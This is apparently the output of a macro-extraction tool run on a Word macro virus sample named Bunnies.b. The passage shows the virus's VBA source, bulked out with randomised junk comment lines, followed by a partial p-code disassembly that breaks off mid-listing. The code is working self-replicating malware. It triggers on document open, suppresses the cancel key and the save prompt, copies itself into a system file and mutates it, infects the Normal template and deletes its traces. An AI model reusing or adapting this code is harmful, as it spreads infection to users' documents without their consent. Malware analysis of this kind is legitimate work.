 '9588614
 '12:15:34
 '7713765
 '1880628
 'T
 '
 '8828058
 'Tester
 '727493
 '
 'T
 'T
 '12:15:32
 '
 'Tester
 'Tester
 'T
 'T
 'T
 '
 '
 '
 '
 '6686048
 '12:15:32
 'T
Do
 'T
 '12:15:32
 '12:15:34
 '12:15:30
 'T
 'T
 '12:15:34
 'T
 '1905144
 'T
 '12:15:34
 'T
 'T
 '4525116
 'T
 'T
 '
 '2485008
 '
 'T
 '
 '
 '
 'T
 '12:15:34
 'T
 '2912940
 '7869626
 'Tester
 '12:15:32
 '
Line Input #3, stuff
 '
 '12:15:32
 '12:15:34
 '
 '127199
 '80255
 'Tester
 '3162338
 '12:15:34
 '12:15:32
 '5190697
 '12:15:30
 '643355
 'T
 'Tester
 '
 'T
 'T
 'T
 'T
 '
 'Tester
 '8365598
 '12:15:25
 '770351
 'T
 '
 '1667250
 'T
 '
 '1261992
Print #4, stuff
 '
 '
 '
 '2548050
 '12:15:34
 'T
 '8472164
 '12:15:25
 'Tester
 'T
 'Tester
 'T
 '12:15:34
 '
 'T
 '12:15:23
 '
 '12:15:32
 '12:15:34
 '
 'Tester
 '702978
 'Tester
 '
 '1130910
 '
 'Tester
 '12:15:30
 'Tester
 'Tester
 '5940415
    Randomize Timer
 '12:15:34
 '8814380
 'T
 '2806128
 '12:15:34
 '
 '
 'Tester
 'Tester
 '3779484
 'Tester
 '12:15:30
 '
 '
 '7765304
 '7617791
 '12:15:35
 '12:15:32
 'T
 '
 'Tester
 '
 '12:15:35
 'Tester
 '12:15:35
 'Tester
 'T
 'Tester
 '7892300
 '12:15:32
 'T
    t = Int(Rnd(1) * 5) + 1
 'Tester
 'Tester
 '12:15:35
 'Tester
 'Tester
 'T
 '
 'T
 'T
 '1116653
 'T
 'Tester
 '
 'Tester
 'T
 '
 'T
 'Tester
 '
 '12:15:30
 '3451525
 '12:15:32
 '9031178
 'T
 '12:15:35
 '
 '8773100
 '
 'Tester
 '108857
 '5102473
        If t = 1 Then Z$ = " '" & Application.UserAddress
 '7634222
 '12:15:32
 'T
 '
 '
 '
 'Tester
 '6959961
 '12:15:35
 'Tester
 'Tester
 '
 'T
 'T
 'Tester
 'Tester
 'T
 '6307147
 '12:15:35
 'T
 'T
 'Tester
 'T
 '
 'T
 '
 '2468244
 '4694725
 '12:15:35
 '
 'T
        If t = 2 Then Z$ = " '" & Application.UserName
 'T
 '
 '6265867
 'Tester
 'Tester
 'Tester
 '4119192
 '12:15:25
 '12:15:35
 '12:15:32
 'T
 '6501271
 '7404745
 'T
 '1460447
 'Tester
 '12:15:35
 '1632476
 '12:15:35
 'T
 '12:15:35
 'T
 '12:15:35
 'Tester
 'T
 'T
 'T
 'Tester
 '7712187
 '6441981
 'T
        If t = 3 Then Z$ = " '" & Time$
 'T
 '6179817
 '
 '12:15:30
 '8588902
 '
 'T
 '8979640
 'Tester
 'T
 'T
 'Tester
 'Tester
 'Tester
 'Tester
 '12:15:23
 '1124737
 'Tester
 '
 '
 '2390612
 '5045025
 '
 '
 'Tester
 '
 '7454109
 'T
 'T
 '6310899
 'T
        If t = 4 Then Z$ = " '" & Application.UserInitials
 '
 '7191700
 'Tester
 'T
 'T
 '1374398
 '
 '12:15:25
 '12:15:35
 'T
 '
 '
 '12:15:35
 'T
 '5180438
 '12:15:23
 'T
 '
 'T
 'T
 '12:15:35
 'Tester
 '7867784
 '
 'Tester
 '12:15:32
 '6991070
 '2830643
 'Tester
 '
 'Tester
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
 '12:15:35
 '12:15:32
 'T
 'Tester
 'T
 '
 'Tester
 '
 'Tester
 '12:15:32
 '12:15:35
 'T
 '9649815
 '9100726
 '
 '12:15:23
 'Tester
 'Tester
 '
 '7640149
 '
 'Tester
 '12:15:35
 'Tester
 'T
 'Tester
 '12:15:35
 '12:15:30
 '
 '12:15:32
 '530616
Print #4, Z$
 '3062365
 '12:15:32
 'T
 '7382071
 'Tester
 '1144921
 '12:15:35
 'Tester
 '6863741
 '3803666
 'Tester
 'Tester
 '12:15:35
 '7732371
 'T
 'T
 'T
 '12:15:32
 '12:15:35
 '3711444
 '8129615
 '12:15:32
 '
 '3707428
 '8125529
 '1271917
 '12:15:35
 '6243193
 '5724862
 '
 '12:15:35
        Loop Until stuff = "' EOF"
 '7117733
 '12:15:32
 'T
 'T
 'T
 '
 '12:15:35
 'T
 '
 'T
 'T
 '
 '
 '
 'Tester
 '7384228
 '
 'T
 '8539204
 'T
 '943958
 'T
 '12:15:35
 'T
 'Tester
 '
 '
 '1437773
 '
 'Tester
 '12:15:35
Close #3
 'Tester
 '
 'T
 '
 'Tester
 'T
 'T
 'Tester
 '8797282
 'T
 '1075040
 '
 'Tester
 'T
 'T
 'Tester
 'T
 'T
 '4872663
 '12:15:30
 '
 'Tester
 '12:15:35
 '12:15:25
 '9936161
 '
 'T
 'T
 '6011542
 '2849319
 'T
Close #4
 'Tester
 'T
 '12:15:35
 '
 '4663949
 '
 '7068702
 'T
 '12:15:35
 '7912817
 'T
 '1222553
 'Tester
 'Tester
 '12:15:35
 'T
 '12:15:35
 'Tester
 'T
 '
 '7195698
 '
 'T
 'Tester
 'Tester
 'T
 '12:15:35
 '12:15:31
 'Tester
 'Tester
 '
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
 'T
 '9305687
 'T
 'T
 '
 '12:15:32
 'T
 '12:15:25
 '3525071
 'Tester
 'Tester
 '
 '12:15:35
 'T
 'T
 '
 '12:15:35
 '12:15:32
 '
 '8817799
 'T
 'Tester
 '
 '
 '
 '12:15:32
 'T
 '12:15:31
 'Tester
 'T
 'T
Kill "C:\Windows\System\b.cpl"
 'Tester
 'Tester
 '12:15:35
 '12:15:31
 '5155590
 '600164
 'T
 'T
 '12:15:35
 'Tester
 '219088
 '5151258
 'Tester
 '342086
 'T
 '12:15:23
 '
 '12:15:32
 '7302265
 'T
 '
 '6671458
 '12:15:35
 '1433757
 'T
 '9203207
 'T
 '
 '12:15:35
 'T
 'T
Dim OldName
 '
 '
 '6450065
 '
 'T
 '7060618
 'Tester
 '2441554
 'T
 'T
 'T
 'Tester
 '2648356
 '
 'Tester
 'T
 '12:15:35
 '
 '12:15:35
 '
 '12:15:35
 '12:15:32
 '12:15:35
 '
 '2263282
 '1607960
 'Tester
 'T
 '6704057
 '12:15:32
 '
Dim NewName
 'Tester
 '12:15:32
 '12:15:35
 '6802207
 '12:15:35
 'T
 'Tester
 '12:15:25
 '12:15:35
 'T
 'T
 '9333955
 'T
 '473168
 'Tester
 'T
 '1386235
 '12:15:32
 '12:15:35
 'Tester
 '2652109
 'T
 'Tester
 '
 'Tester
 'T
 '7715607
 '12:15:31
 'T
 'T
 'T
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
 '
 'Tester
 'Tester
 'T
 '12:15:35
 '12:15:32
 '
 '12:15:25
 '12:15:35
 '9076211
 '
 'Tester
 '12:15:35
 'T
 '5441936
 '12:15:23
 '6449732
 'Tester
 '
 '12:15:31
 'Tester
 '
 '
 'Tester
 '12:15:35
 'T
 '
 'Tester
 '
 '9762221
 'Tester
Name OldName As NewName
 'Tester
 'T
 '12:15:35
 '12:15:31
 'T
 '901100
 '
 '12:15:25
 'Tester
 '12:15:33
 'Tester
 'T
 '12:15:35
 '12:15:33
 '9911312
 '
 'Tester
 '
 'Tester
 'T
 '4720819
 '12:15:33
 '12:15:35
 '12:15:25
 'T
 '12:15:33
 '12:15:35
 '12:15:31
 '
 'T
 '792114
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
 '3323862
 'T
 'T
 '
 '7637641
 '4698723
 'Tester
 '12:15:25
 '2443062
 '
 '
 'Tester
 '2057988
 '12:15:33
 'Tester
 'Tester
 'T
 'Tester
 'Tester
 '
 '5646897
 '
 '12:15:35
 'Tester
 'Tester
 'T
 'T
 '5950008
 '12:15:35
 'T
 'Tester
    End With
 '12:15:35
 '
 'T
 '12:15:31
 '12:15:35
 'T
 '12:15:35
 '12:15:25
 '
 'Tester
 '
 '3549341
 'T
 '12:15:33
 '4639101
 'Tester
 'T
 'T
 '
 '12:15:31
 'T
 '
 '
 '8045723
 '12:15:35
 '12:15:33
 'T
 '4942211
 '12:15:35
 '
 '738997
Next X
 '
 '2064494
 '
 '12:15:31
 '12:15:35
 '6120195
 'Tester
 '
 '12:15:35
 'Tester
 '12:15:35
 'T
 '12:15:35
 '
 'T
 'Tester
 '
 'Tester
 '
 'Tester
 '12:15:35
 '
 '12:15:35
 'Tester
 'T
 '
 '
 'Tester
 'T
 'T
 'Tester
NormalTemplate.Save
 'T
 '
 'Tester
 'T
 'Tester
 'Tester
 'T
 'T
 '1255153
 'Tester
 'Tester
 'Tester
 'Tester
 'T
 'Tester
 'Tester
 '8723070
 '12:15:33
 'T
 '12:15:31
 '12:15:35
 '9663826
 'T
 '12:15:25
 'Tester
 '2322572
 'T
 '
 '12:15:35
 'T
 'T
MsgBox "Bunnies!!!!", 48
 '7457195
 '5604039
 'T
 '12:15:31
 'Tester
 '12:15:33
 'T
 '
 'Tester
 'T
 '
 '12:15:31
 '9993030
 'Tester
 '
 '
 '1258906
 '12:15:33
 '
 '
 'Tester
 '
 '6322403
 '
 'T
 '282463
 '12:15:35
 '12:15:31
 '8337996
 '12:15:33
 'T
Kill "C:\Windows\System\Bunnies.cpl"
 '4667369
 '
 '7199118
 '6027973
 '12:15:35
 '12:15:33
 '5417087
 '6648766
 'T
 'T
 '12:15:35
 'T
 '480586
 '6480753
 'Tester
 '5110557
 'T
 'Tester
 '
 '12:15:31
 'Tester
 'Tester
 '
 'Tester
 '12:15:35
 '12:15:33
 '12:15:35
 '1091471
 'T
 'Tester
 '
Kill "C:\Windows\System\B.cpl"
 '
 '12:15:33
 'Tester
 '448319
 '12:15:35
 '6095679
 '12:15:35
 '12:15:25
 '
 '
 'Tester
 '3107064
 'T
 'T
 '
 'T
 '12:15:35
 '
 'Tester
 '7035769
 '
 '2687216
 'Tester
 'Tester
 '12:15:35
 'Tester
 '12:15:35
 '12:15:31
 '12:15:35
 '12:15:33
 '12:15:35
End Function
 'Tester
 'T
 '
 'T
 'Tester
 '
 '6965555
 '319395
 '
 '12:15:33
 'Tester
 '575315
 '12:15:35
 'Tester
 '12:15:35
 '9915977
 'Tester
 '
 '8231429
 '
 '509187
 'T
 'Tester
 'T
 'Tester
 'T
 'T
 '12:15:31
 'Tester
 '
 'Tester
' EOF
 'T
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bunny.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/BunniesB - 9055 bytes
' Line #0:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #2:
' 	QuoteRem 0x0001 0x0000 ""
' Line #3:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #4:
' 	QuoteRem 0x0001 0x0007 "8961297"
' Line #5:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #6:
' 	QuoteRem 0x0001 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #8:
' 	QuoteRem 0x0001 0x0007 "5163674"
' Line #9:
' 	FuncDefn (Sub AutoOpen())
' Line #10:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	QuoteRem 0x0001 0x0000 ""
' Line #13:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #14:
' 	QuoteRem 0x0001 0x0000 ""
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	QuoteRem 0x0001 0x0007 "9088293"
' Line #17:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #18:
' 	QuoteRem 0x0001 0x0000 ""
' Line #19:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #20:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #21:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	QuoteRem 0x0001 0x0000 ""
' Line #23:
' 	ArgsCall (Call) Spread 0x0000 
' Line #24:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #25:
' 	EndSub 
' Line #26:
' 	QuoteRem 0x0001 0x0000 ""
' Line #27:
' 	FuncDefn (Function Spread())
' Line #28:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	QuoteRem 0x0001 0x0000 ""
' Line #31:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #32:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #33:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #34:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #35:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #36:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #37:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #38:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #39:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #40:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #41:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #42:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #43:
' 	Do 
' Line #44:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #45:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #46:
' 	QuoteRem 0x0001 0x0000 ""
' Line #47:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #48:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #49:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #50:
' 	QuoteRem 0x0001 0x0007 "7617791"
' Line #51:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #52:
' 	QuoteRem 0x0001 0x0000 ""
' Line #53:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #54:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #55:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #56:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #57:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #58:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #59:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #60:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #61:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #62:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #63:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #64:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #65:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #66:
' 	QuoteRem 0x0001 0x0007 "7384228"
' Line #67:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #68:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #69:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #71:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #72:
' 	QuoteRem 0x0001 0x0000 ""
' Line #73:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #74:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #75:
' 	Dim 
' 	VarDefn OldName
' Line #76:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #77:
' 	Dim 
' 	VarDefn NewName
' Line #78:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #79:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #80:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #81:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #82:
' 	QuoteRem 0x0001 0x0000 ""
' Line #83:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #84:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #85:
' 	EndWith 
' Line #86:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #87:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #89:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #90:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #91:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #92:
' 	QuoteRem 0x0001 0x0000 ""
' Line #93:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #94:
' 	QuoteRem 0x0001 0x0007 "5110557"
' Line #95:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #96:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #97:
' 	EndFunc 
' Line #98:
' 	QuoteRem 0x0001 0x0007 "9915977"
' Line #99:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #100:
' 	QuoteRem 0x0001 0x0000 ""
' Macros/VBA/BunniesB1 - 11904 bytes
' Line #0:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #2:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #3:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #4:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #5:
' 	QuoteRem 0x0001 0x0000 ""
' Line #6:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #7:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #8:
' 	QuoteRem 0x0001 0x0006 "733070"
' Line #9:
' 	QuoteRem 0x0001 0x0007 "8961297"
' Line #10:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #11:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #12:
' 	QuoteRem 0x0001 0x0000 ""
' Line #13:
' 	QuoteRem 0x0001 0x0000 ""
' Line #14:
' 	QuoteRem 0x0001 0x0000 ""
' Line #15:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #16:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #17:
' 	QuoteRem 0x0001 0x0007 "5163674"
' Line #18:
' 	QuoteRem 0x0001 0x0000 ""
' Line #19:
' 	FuncDefn (Sub AutoOpen())
' Line #20:
' 	QuoteRem 0x0001 0x0000 ""
' Line #21:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #22:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #25:
' 	QuoteRem 0x0001 0x0000 ""
' Line #26:
' 	QuoteRem 0x0001 0x0007 "3010827"
' Line #27:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #28:
' 	QuoteRem 0x0001 0x0000 ""
' Line #29:
' 	QuoteRem 0x0001 0x0000 ""
' Line #30:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #32:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #33:
' 	QuoteRem 0x0001 0x0007 "9088293"
' Line #34:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #35:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #36:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #37:
' 	QuoteRem 0x0001 0x0000 ""
' Line #38:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #39:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #40:
' 	QuoteRem 0x0001 0x0007 "6185727"
' Line #41:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #42:
' 	QuoteRem 0x0001 0x0007 "8590480"
' Line #43:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #44:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #45:
' 	QuoteRem 0x0001 0x0000 ""
' Line #46:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #47:
' 	ArgsCall (Call) Spread 0x0000 
' Line #48:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #49:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #50:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #51:
' 	EndSub 
' Line #52:
' 	QuoteRem 0x0001 0x0007 "3424502"
' Line #53:
' 	QuoteRem 0x0001 0x0000 ""
' Line #54:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #55:
' 	FuncDefn (Function Spread())
' Line #56:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #57:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #58:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	QuoteRem 0x0001 0x0000 ""
' Line #61:
' 	QuoteRem 0x0001 0x0000 ""
' Line #62:
' 	QuoteRem 0x0001 0x0000 ""
' Line #63:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #64:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #65:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #66:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #67:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #68:
' 	QuoteRem 0x0001 0x0007 "7349121"
' Line #69:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #70:
' 	QuoteRem 0x0001 0x0000 ""
' Line #71:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #72:
' 	QuoteRem 0x0001 0x0007 "2519186"
' Line #73:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #74:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #75:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #76:
' 	QuoteRem 0x0001 0x0006 "372511"
' Line #77:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #78:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #79:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #80:
' 	QuoteRem 0x0001 0x0007 "3035342"
' Line #81:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #82:
' 	QuoteRem 0x0001 0x0000 ""
' Line #83:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #84:
' 	QuoteRem 0x0001 0x0007 "7713765"
' Line #85:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #86:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #87:
' 	Do 
' Line #88:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #89:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #90:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #91:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #92:
' 	QuoteRem 0x0001 0x0007 "3162338"
' Line #93:
' 	QuoteRem 0x0001 0x0000 ""
' Line #94:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #95:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #96:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #97:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #98:
' 	QuoteRem 0x0001 0x0000 ""
' Line #99:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #100:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #101:
' 	QuoteRem 0x0001 0x0007 "7617791"
' Line #102:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #103:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #104:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #105:
' 	QuoteRem 0x0001 0x0000 ""
' Line #106:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #107:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #108:
' 	QuoteRem 0x0001 0x0007 "6959961"
' Line #109:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #110:
' 	QuoteRem 0x0001 0x0000 ""
' Line #111:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #112:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #113:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #114:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #115:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #116:
' 	QuoteRem 0x0001 0x0007 "8979640"
' Line #117:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #118:
' 	QuoteRem 0x0001 0x0000 ""
' Line #119:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #120:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #121:
